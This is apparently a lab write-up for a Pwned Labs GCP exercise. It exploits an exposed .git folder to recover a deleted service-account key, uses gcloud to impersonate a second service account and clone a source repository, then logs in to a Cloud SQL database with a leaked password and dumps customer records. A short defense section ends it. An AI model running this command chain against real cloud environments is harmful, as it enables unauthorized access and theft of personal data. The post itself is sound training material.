---
title: Impersonate GCP Service Account for Privileged Access
description: Impersonate GCP Service Account for Privileged Access 
image:
  path: gcp.png
categories:
- Pwned Labs
- GCP
layout: post
media_subpath: /assets/posts/labs/pwnedlabs/gcp/
tags:
- pwnedlabs
- gcp
- cloud
---
# Scenario
During a routine external engagement for Gigantic Retail, your team stumbles upon a subdomain hosting a web server. Now, your task is to explore the newly discovered subdomain and figure out a way to access their GCP cloud environment. 

# Walkthrough
We see the website hosted

![](impersonate-gcp-service-account-for-privileged-access-1.png)

Nothing interesting in the source code nor in functionality. We can `ping` the domain to reveal IP address and run `whois`, which will return that IP address is assigned to the range of the Google Cloud. But we can also simply run `nmap` with option to run scripts on detected ports
```
└─$ nmap -Pn -sC shop.gigantic-retail.com   
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-07 21:20 +06
Nmap scan report for shop.gigantic-retail.com (35.209.3.194)
Host is up (0.21s latency).
rDNS record for 35.209.3.194: 194.3.209.35.bc.googleusercontent.com
Not shown: 995 filtered tcp ports (no-response)
PORT     STATE  SERVICE
22/tcp   open   ssh
| ssh-hostkey: 
|   3072 cb:39:1f:ad:1e:1d:da:57:6f:0a:e7:70:34:c2:ac:f9 (RSA)
|   256 66:46:c7:3e:ee:55:b2:e3:e2:f0:8e:e7:81:61:cb:99 (ECDSA)
|_  256 46:68:bc:f1:35:6e:83:06:41:f6:a0:93:b7:92:7b:12 (ED25519)
80/tcp   open   http
|_http-title: Gigantic Retail
| http-git: 
|   35.209.3.194:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|     Remotes:
|_      https://github.com/Gigantic-Retail/new.gigantic-retail.com.git
1433/tcp closed ms-sql-s
3389/tcp closed ms-wbt-server
5432/tcp closed postgresql

Nmap done: 1 IP address (1 host up) scanned in 20.63 seconds
```

The result shows that there's exposed git repository. We can check out the remote repository: `https://github.com/Gigantic-Retail/new.gigantic-retail.com.git` in the browser, but the local repository may contain more information that hasn't yet been pushed to the remote origin.

Let's download it using `wget` (we can also use `git-dumper`)
```
wget -r http://shop.gigantic-retail.com/.git
```
```
└─$ ls -lha
total 132K
drwxrwxr-x 5 kali kali 4.0K Sep  7 21:25 .
drwxrwxr-x 5 kali kali 4.0K Sep  7 21:25 ..
drwxrwxr-x 5 kali kali 4.0K Sep  7 21:26 assets
drwxrwxr-x 8 kali kali 4.0K Sep  7 21:25 .git
drwxrwxr-x 2 kali kali 4.0K Sep  7 21:25 icons
-rw-rw-r-- 1 kali kali 112K Jan 14  2024 index.html
```

We can view git logs
```
└─$ git log                                               
commit ece5cf83bc3a28f0f17d26e724a9c494a3283d6e (HEAD -> main, origin/main, origin/HEAD)
Author: s-lopezz <156240946+s-lopezz@users.noreply.github.com>
Date:   Sat Jan 13 23:52:35 2024 +0530

    Add files via upload

commit 7688e1810226baf4e21bf94b3e6c501149fac6f5
Author: s-lopezz <156240946+s-lopezz@users.noreply.github.com>
Date:   Sat Jan 13 23:48:14 2024 +0530

    Add files via upload

commit 7ce31ae6bf5c672fa9ef9127f3708b272556a475
Author: s-lopezz <156240946+s-lopezz@users.noreply.github.com>
Date:   Sat Jan 13 23:45:32 2024 +0530

    Initial commit

```

List all branches
```
└─$ git branch -a
<SNIP>
* main
  remotes/origin/HEAD -> origin/main
  remotes/origin/dev
```

Let's switch to `dev` branch
```
└─$ git checkout dev                                      
D       README.md
branch 'dev' set up to track 'origin/dev'.
Switched to a new branch 'dev'
```
```
└─$ git branch      
<SNIP>
* dev
  main
```

The logs show more entries
```
└─$ git log   
commit c0297dabb406dee0b9d0b4b96d40d1d9d96c9fde (HEAD -> dev, origin/dev)
Author: s-lopezz <156240946+s-lopezz@users.noreply.github.com>
Date:   Sat Jan 13 23:53:58 2024 +0530

    Delete token.json

commit efbe6e85cc0e1d25aad81c984d85f661af9abf72
Author: s-lopezz <156240946+s-lopezz@users.noreply.github.com>
Date:   Sat Jan 13 23:53:42 2024 +0530

    Add files via upload

commit 4164a2d239d7ea971712c05a4cb5565b56acafdd
Author: s-lopezz <156240946+s-lopezz@users.noreply.github.com>
Date:   Sat Jan 13 23:53:17 2024 +0530

    Add files via upload

commit 85c9f4029e474272dd6cb58c754830118ce0b4e1
Author: s-lopezz <156240946+s-lopezz@users.noreply.github.com>
Date:   Sat Jan 13 23:53:00 2024 +0530

    Create login.php

commit 7688e1810226baf4e21bf94b3e6c501149fac6f5
Author: s-lopezz <156240946+s-lopezz@users.noreply.github.com>
Date:   Sat Jan 13 23:48:14 2024 +0530

    Add files via upload

commit 7ce31ae6bf5c672fa9ef9127f3708b272556a475
Author: s-lopezz <156240946+s-lopezz@users.noreply.github.com>
Date:   Sat Jan 13 23:45:32 2024 +0530

    Initial commit

```

The entry `Delete token.json` is the most interesting one. The file could have been removed due to security concerns. And we can confirm it since it's an access token for the GCP service account named `internal-web-dev-team@gr-proj-1.iam.gserviceaccount.com` in the project named `gr-proj-1`.
```
└─$ git show c0297dabb406dee0b9d0b4b96d40d1d9d96c9fde
commit c0297dabb406dee0b9d0b4b96d40d1d9d96c9fde (HEAD -> dev, origin/dev)
Author: s-lopezz <156240946+s-lopezz@users.noreply.github.com>
Date:   Sat Jan 13 23:53:58 2024 +0530

    Delete token.json

diff --git a/token.json b/token.json
deleted file mode 100644
index 33df372..0000000
--- a/token.json
+++ /dev/null
@@ -1,15 +0,0 @@
-{
-  "type": "service_account",
-  "project_id": "gr-proj-1",
-  "private_key_id": "6da5f1f3ed2f1b3f38e900e4ef1d1021a5f1e72c",
-  "private_key": "<REDACTED>",
-  "client_email": "internal-web-dev-team@gr-proj-1.iam.gserviceaccount.com",
-  "client_id": "101131465436700832066",
-  "auth_uri": "https://accounts.google.com/o/oauth2/auth",
-  "token_uri": "https://oauth2.googleapis.com/token",
-  "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
-  "client_x509_cert_url": "https://www.googleapis.com/robot/v1/metadata/x509/internal-web-dev-team%40gr-proj-1.iam.gserviceaccount.com",
-  "universe_domain": "googleapis.com"
-}
-
-

```

Retrieve the exact contents of the file with the command below. The `^` symbol is used to reference the parent commit of the specified commit hash, as the log shows the content of `token.json` as it was in the commit immediately before 
```
└─$ git show c0297dabb406dee0b9d0b4b96d40d1d9d96c9fde^:token.json > token.json
   
```

Let's authenticate using service key file
```
└─$ gcloud auth activate-service-account --key-file=token.json
Activated service account credentials for: [internal-web-dev-team@gr-proj-1.iam.gserviceaccount.com]
    
```
Let's enumerate IAM roles and policies
```
└─$ gcloud projects get-iam-policy gr-proj-1 --format=json
{
  "bindings": [
    {
      "members": [
        "serviceAccount:internal-web-dev-team@gr-proj-1.iam.gserviceaccount.com"
      ],
      "role": "projects/gr-proj-1/roles/CustomAppDevRole"
    },
    {
      "members": [
        "serviceAccount:sv1-337@gr-proj-1.iam.gserviceaccount.com"
      ],
      "role": "projects/gr-proj-1/roles/CustomFrontendAppDevRole"
    },
    {
      "members": [
        "serviceAccount:bucketviewer@gr-proj-1.iam.gserviceaccount.com",
        "serviceAccount:frontend-dev-buckets@gr-proj-1.iam.gserviceaccount.com",
        "serviceAccount:sv3-939@gr-proj-1.iam.gserviceaccount.com"
      ],
      "role": "projects/gr-proj-1/roles/CustomRole"
    },
    {
      "members": [
        "serviceAccount:appdev@gr-proj-1.iam.gserviceaccount.com"
      ],
      "role": "projects/gr-proj-1/roles/CustomRole178"
    },
    {
      "members": [
        "serviceAccount:setmetadata@gr-proj-1.iam.gserviceaccount.com"
      ],
      "role": "projects/gr-proj-1/roles/CustomRole353"
    },
    {
      "members": [
        "serviceAccount:setmetadata@gr-proj-1.iam.gserviceaccount.com"
      ],
      "role": "projects/gr-proj-1/roles/CustomRole44"
    },
    {
      "members": [
        "serviceAccount:devops-re@gr-proj-1.iam.gserviceaccount.com"
      ],
      "role": "projects/gr-proj-1/roles/CustomRole606"
    },
    {
      "members": [
        "serviceAccount:sv3-939@gr-proj-1.iam.gserviceaccount.com"
      ],
      "role": "projects/gr-proj-1/roles/CustomRole829"
    },
    {
      "members": [
        "serviceAccount:service-212055223570@gcp-gae-service.iam.gserviceaccount.com"
      ],
      "role": "roles/appengine.serviceAgent"
    },
    {
      "members": [
        "serviceAccount:service-212055223570@gcp-sa-artifactregistry.iam.gserviceaccount.com"
      ],
      "role": "roles/artifactregistry.serviceAgent"
    },
    {
      "members": [
        "serviceAccount:212055223570@cloudbuild.gserviceaccount.com"
      ],
      "role": "roles/cloudbuild.builds.builder"
    },
    {
      "members": [
        "serviceAccount:service-212055223570@gcp-sa-cloudbuild.iam.gserviceaccount.com"
      ],
      "role": "roles/cloudbuild.serviceAgent"
    },
    {
      "members": [
        "serviceAccount:service-212055223570@gcf-admin-robot.iam.gserviceaccount.com"
      ],
      "role": "roles/cloudfunctions.serviceAgent"
    },
    {
      "members": [
        "serviceAccount:appdev@gr-proj-1.iam.gserviceaccount.com"
      ],
      "role": "roles/cloudsql.client"
    },
    {
      "members": [
        "serviceAccount:appdev@gr-proj-1.iam.gserviceaccount.com",
        "serviceAccount:intermediate-account-dev-team@gr-proj-1.iam.gserviceaccount.com"
      ],
      "role": "roles/cloudsql.viewer"
    },
    {
      "members": [
        "serviceAccount:service-212055223570@compute-system.iam.gserviceaccount.com"
      ],
      "role": "roles/compute.serviceAgent"
    },
    {
      "members": [
        "serviceAccount:service-212055223570@container-engine-robot.iam.gserviceaccount.com"
      ],
      "role": "roles/container.serviceAgent"
    },
    {
      "members": [
        "serviceAccount:service-212055223570@containerregistry.iam.gserviceaccount.com"
      ],
      "role": "roles/containerregistry.ServiceAgent"
    },
    {
      "members": [
        "serviceAccount:212055223570-compute@developer.gserviceaccount.com",
        "serviceAccount:212055223570@cloudservices.gserviceaccount.com",
        "serviceAccount:gr-proj-1@appspot.gserviceaccount.com"
      ],
      "role": "roles/editor"
    },
    {
      "members": [
        "serviceAccount:service-212055223570@firebase-rules.iam.gserviceaccount.com"
      ],
      "role": "roles/firebaserules.system"
    },
    {
      "members": [
        "serviceAccount:service-212055223570@gcp-sa-firestore.iam.gserviceaccount.com"
      ],
      "role": "roles/firestore.serviceAgent"
    },
    {
      "members": [
        "serviceAccount:appdev@gr-proj-1.iam.gserviceaccount.com",
        "serviceAccount:intermediate-account-dev-team@gr-proj-1.iam.gserviceaccount.com",
        "serviceAccount:internal-web-dev-team@gr-proj-1.iam.gserviceaccount.com"
      ],
      "role": "roles/iam.roleViewer"
    },
    {
      "members": [
        "serviceAccount:setmetadata@gr-proj-1.iam.gserviceaccount.com"
      ],
      "role": "roles/iam.serviceAccountUser"
    },
    {
      "members": [
        "user:ayush@pwnedlabs.io",
        "user:ian@pwnedlabs.io"
      ],
      "role": "roles/owner"
    },
    {
      "members": [
        "serviceAccount:service-212055223570@gcp-sa-pubsub.iam.gserviceaccount.com"
      ],
      "role": "roles/pubsub.serviceAgent"
    },
    {
      "members": [
        "serviceAccount:service-212055223570@cloud-redis.iam.gserviceaccount.com"
      ],
      "role": "roles/redis.serviceAgent"
    },
    {
      "members": [
        "serviceAccount:appdev@gr-proj-1.iam.gserviceaccount.com"
      ],
      "role": "roles/secretmanager.secretAccessor"
    },
    {
      "members": [
        "serviceAccount:intermediate-account-dev-team@gr-proj-1.iam.gserviceaccount.com"
      ],
      "role": "roles/source.reader"
    }
  ],
  "etag": "BwYRmwH25Ns=",
  "version": 1
}

```

We can use [iam-policy-visualize](https://github.com/hac01/iam-policy-visualize) to visualize the role assignments. First save the IAM role assignments to file
```
└─$ gcloud projects get-iam-policy gr-proj-1 --format=json > project.json
```

Our user `internal-web-dev-team@gr-proj-1.iam.gserviceaccount.com` has the `CustomAppDevRole` and `roleViewer` permissions. 

![](impersonate-gcp-service-account-for-privileged-access-2.png)

Let's check what permissions have been included in the `CustomAppDevRole`
```
└─$ gcloud iam roles describe CustomAppDevRole --project=gr-proj-1
description: 'Created on: 2024-01-10 Based on: AppDevRole'
etag: BwYOqVE8gq0=
includedPermissions:
- iam.serviceAccounts.getIamPolicy
- iam.serviceAccounts.list
- resourcemanager.projects.get
- resourcemanager.projects.getIamPolicy
name: projects/gr-proj-1/roles/CustomAppDevRole
stage: ALPHA
title: Frontend AppDevRole

```

It allows to view the IAM policies and service accounts, which is useful from an offensive perspective as we need to map out the environment. Let's check IAM policies have been bound to other service accounts, such as `intermediate-account-dev-team@gr-proj-1.iam.gserviceaccount.com`, since it has `cloudsql_viewer` and `source_reader` roles
```
└─$ gcloud iam service-accounts get-iam-policy intermediate-account-dev-team@gr-proj-1.iam.gserviceaccount.com
bindings:
- members:
  - serviceAccount:internal-web-dev-team@gr-proj-1.iam.gserviceaccount.com
  role: roles/iam.serviceAccountTokenCreator
etag: BwYPTPjxLqw=
version: 1

```

We see that the `intermediate-account-dev-team` service account has an IAM policy attached that allows our current `internal-web-dev-team` service account to create tokens for it with the `serviceAccountTokenCreator` role. 

This means we can impersonate the service account using the following command:
```
└─$ gcloud config set auth/impersonate_service_account intermediate-account-dev-team@gr-proj-1.iam.gserviceaccount.com
Updated property [auth/impersonate_service_account].

```

> It's good to `UNSET` an impersonation configuration at the end of the lab, or we can be met with gcloud complaints in other labs.
{: .prompt-info }
```
gcloud config unset auth/impersonate_service_account
```
Validate the impersonation
```
└─$ gcloud config list
[auth]
impersonate_service_account = intermediate-account-dev-team@gr-proj-1.iam.gserviceaccount.com
[core]
account = internal-web-dev-team@gr-proj-1.iam.gserviceaccount.com
disable_usage_reporting = True
project = gr-proj-1

Your active configuration is: [default]
```

Retrieve the roles assigned to our impersonated user using the following command:
```
WARNING: This command is using service account impersonation. All API calls will be executed as [intermediate-account-dev-team@gr-proj-1.iam.gserviceaccount.com].
WARNING: This command is using service account impersonation. All API calls will be executed as [intermediate-account-dev-team@gr-proj-1.iam.gserviceaccount.com].
ROLE                   MEMBERS
roles/cloudsql.viewer  serviceAccount:intermediate-account-dev-team@gr-proj-1.iam.gserviceaccount.com
roles/iam.roleViewer   serviceAccount:intermediate-account-dev-team@gr-proj-1.iam.gserviceaccount.com
roles/source.reader    serviceAccount:intermediate-account-dev-team@gr-proj-1.iam.gserviceaccount.com

```

We see that they are assigned the roles `source.reader` and `cloudsql.viewer` (same as we saw in visualization). 

The `source.reader` role allows accessing and reading repositories within Google Cloud Source Repositories. This could help us view and retrieve potentially sensitive source code from repositories in the GCP Cloud. Let's list repositories in Google Cloud Source Repositories
```
└─$ gcloud source repos list --project=gr-proj-1
WARNING: This command is using service account impersonation. All API calls will be executed as [intermediate-account-dev-team@gr-proj-1.iam.gserviceaccount.com].
WARNING: This command is using service account impersonation. All API calls will be executed as [intermediate-account-dev-team@gr-proj-1.iam.gserviceaccount.com].
REPO_NAME    PROJECT_ID  URL
guides-docs  gr-proj-1   https://source.developers.google.com/p/gr-proj-1/r/guides-docs

```
It reveals the repository name (`guides-docs`), the project ID (`gr-proj-1`), and the repository URL. Let's clone the repository locally to perform a detailed analysis:
```
└─$ gcloud source repos clone guides-docs --project=gr-proj-1
WARNING: This command is using service account impersonation. All API calls will be executed as [intermediate-account-dev-team@gr-proj-1.iam.gserviceaccount.com].
WARNING: This command is using service account impersonation. All API calls will be executed as [intermediate-account-dev-team@gr-proj-1.iam.gserviceaccount.com].
WARNING: This command is using service account impersonation. All API calls will be executed as [intermediate-account-dev-team@gr-proj-1.iam.gserviceaccount.com].
Cloning into '/home/kali/pwnedlabs/gcp/guides-docs'...
WARNING: This command is using service account impersonation. All API calls will be executed as [intermediate-account-dev-team@gr-proj-1.iam.gserviceaccount.com].
remote: Total 15 (delta 3), reused 15 (delta 3)
Receiving objects: 100% (15/15), done.
Resolving deltas: 100% (3/3), done.
Project [gr-proj-1] repository [guides-docs] was cloned to [/home/kali/pwnedlabs/gcp/guides-docs].
```
```
└─$ ls -lha
total 20K
drwxrwxr-x 3 kali kali 4.0K Sep  7 21:59 .
drwxrwxr-x 6 kali kali 4.0K Sep  7 21:59 ..
-rw-rw-r-- 1 kali kali 1.5K Sep  7 21:59 cloud-sql.md
drwxrwxr-x 8 kali kali 4.0K Sep  7 21:59 .git
-rw-rw-r-- 1 kali kali   75 Sep  7 21:59 Readme.md
                                                   
```
```
└─$ cat cloud-sql.md 
# Setting up Google Cloud SQL
<SNIP>
4. Connect to the Cloud SQL instance:

    ```bash
        PGPASSWORD='<REDACTED>' psql -h $customer-app-1 -U db_connect -p 5432 -d postgres -w

    ```
```

We see credentials for connecting to a PostgreSQL Cloud SQL database in the `cloud-sql.md` file. Usually, internal documentation stored in SharePoint, Wikis or repositories are a rich source of credentials for lateral and vertical movement

Identify running Cloud SQL instances
```
└─$ gcloud sql instances list --project=gr-proj-1
WARNING: This command is using service account impersonation. All API calls will be executed as [intermediate-account-dev-team@gr-proj-1.iam.gserviceaccount.com].
WARNING: This command is using service account impersonation. All API calls will be executed as [intermediate-account-dev-team@gr-proj-1.iam.gserviceaccount.com].
NAME                       DATABASE_VERSION  LOCATION       TIER         PRIMARY_ADDRESS  PRIVATE_ADDRESS  STATUS
gigantic-retail-backup-db  MYSQL_8_0_31      us-central1-b  db-f1-micro  34.134.161.125   -                RUNNABLE
customer-app-1             POSTGRES_15       us-central1-f  db-f1-micro  34.31.83.80      -                RUNNABLE
```

We need `psql` client to connect to PostgreSQL database 
```
apt install postgresql-client-common
apt-get install postgresql-client
```

Connect to dabase using credentials found in `cloud-sql.md`
```
└─$ psql -h 34.31.83.80 -U db_connect -p 5432 -d postgres
Password for user db_connect: 
psql (17.2 (Debian 17.2-1.pgdg120+1), server 15.13)
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, compression: off, ALPN: none)
Type "help" for help.

postgres=> \l
                                                                    List of databases
     Name      |       Owner       | Encoding | Locale Provider |  Collate   |   Ctype    | Locale | ICU Rules |            Access privileges            
---------------+-------------------+----------+-----------------+------------+------------+--------+-----------+-----------------------------------------
 cloudsqladmin | cloudsqladmin     | UTF8     | libc            | en_US.UTF8 | en_US.UTF8 |        |           | 
 flag          | postgres          | UTF8     | libc            | en_US.UTF8 | en_US.UTF8 |        |           | =Tc/postgres                           +
               |                   |          |                 |            |            |        |           | postgres=CTc/postgres                  +
               |                   |          |                 |            |            |        |           | db_connect=c/postgres
 postgres      | cloudsqlsuperuser | UTF8     | libc            | en_US.UTF8 | en_US.UTF8 |        |           | 
 template0     | cloudsqladmin     | UTF8     | libc            | en_US.UTF8 | en_US.UTF8 |        |           | =c/cloudsqladmin                       +
               |                   |          |                 |            |            |        |           | cloudsqladmin=CTc/cloudsqladmin
 template1     | cloudsqlsuperuser | UTF8     | libc            | en_US.UTF8 | en_US.UTF8 |        |           | =c/cloudsqlsuperuser                   +
               |                   |          |                 |            |            |        |           | cloudsqlsuperuser=CTc/cloudsqlsuperuser
 userdb        | postgres          | UTF8     | libc            | en_US.UTF8 | en_US.UTF8 |        |           | =Tc/postgres                           +
               |                   |          |                 |            |            |        |           | postgres=CTc/postgres                  +
               |                   |          |                 |            |            |        |           | db_connect=c/postgres
(6 rows)

postgres=> 

```
We see `userdb` database which contains `user_table` that returns customer names, birthdays and phone numbers.
```
postgres=> \c userdb
psql (17.2 (Debian 17.2-1.pgdg120+1), server 15.13)
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, compression: off, ALPN: none)
You are now connected to database "userdb" as user "db_connect".
userdb=> \dt
           List of relations
 Schema |    Name    | Type  |  Owner   
--------+------------+-------+----------
 public | user_table | table | postgres
(1 row)

userdb=> select * from user_table;
 id | first_name | last_name | birthdate  |    phone    
----+------------+-----------+------------+-------------
  1 | John       | Doe       | 1990-01-15 | +1234567890
  2 | Jane       | Smith     | 1985-05-20 | +1987654321
  3 | Michael    | Johnson   | 1992-08-10 | +1654321876
<SNIP>
```

# Defense
Based on lab's [Defense](https://pwnedlabs.io/labs/impersonate-gcp-service-account-for-privileged-access) section.

- Do not expose `.git` folder in the web root
- Working from the web root and initializing it as a git repository is never a good idea. 
  - Not only because it exposes the `.git` directory, but also other sensitive files such as exports, backups and text editor crash dump files can be created and accessible by anyone on the internet. 
- Do not store the service account token within the web root and configure the `.gitignore` file to prevent committing the token.
- Wikis and guides should include a reference to GCP Secret Manager, where the credential could be securely stored. 
- The personal data should of course have been encrypted as rest
